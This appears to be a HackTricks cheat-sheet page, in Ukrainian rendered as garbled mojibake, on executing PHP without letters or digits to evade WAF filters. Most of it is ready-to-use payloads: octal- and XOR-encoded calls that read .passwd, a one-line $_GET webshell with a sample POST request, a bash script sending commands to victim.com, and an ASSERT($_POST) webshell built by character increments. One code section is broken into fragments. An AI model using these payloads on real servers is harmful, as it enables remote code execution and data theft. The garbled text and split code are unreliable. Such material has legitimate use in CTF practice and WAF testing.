## –í–∏–∫–æ–Ω–∞–Ω–Ω—è PHP –±–µ–∑ –ª—ñ—Ç–µ—Ä

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—ñ—Å—ñ–º–∫–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —á–∏—Å–ª–µ–Ω–Ω—è
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (–µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–µ –∞–±–æ) - —Ü–µ –±—ñ–Ω–∞—Ä–Ω–∏–π –æ–ø–µ—Ä–∞—Ç–æ—Ä, —è–∫–∏–π –ø–æ–≤–µ—Ä—Ç–∞—î —ñ—Å—Ç–∏–Ω—É –ª–∏—à–µ –≤ —Ç–æ–º—É –≤–∏–ø–∞–¥–∫—É, –∫–æ–ª–∏ –æ–ø–µ—Ä–∞–Ω–¥–∏ –º–∞—é—Ç—å —Ä—ñ–∑–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR –ø—Ä–æ—Å—Ç–∏–π –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º –æ–ø–∏—Å–æ–º**](https://mgp25.com/ctf/Web-challenge/), –º–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –ø—Ä–æ—Å—Ç–∏–π –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π PHP –±–µ–∑ —Ü–∏—Ñ—Ä —Ç–∞ –ª—ñ—Ç–µ—Ä**, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ PHP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–∞–∫–∏–π –≤–∏—Ç—ñ–≤, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### –ü–æ–¥—ñ–±–Ω–æ –¥–æ Perl
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
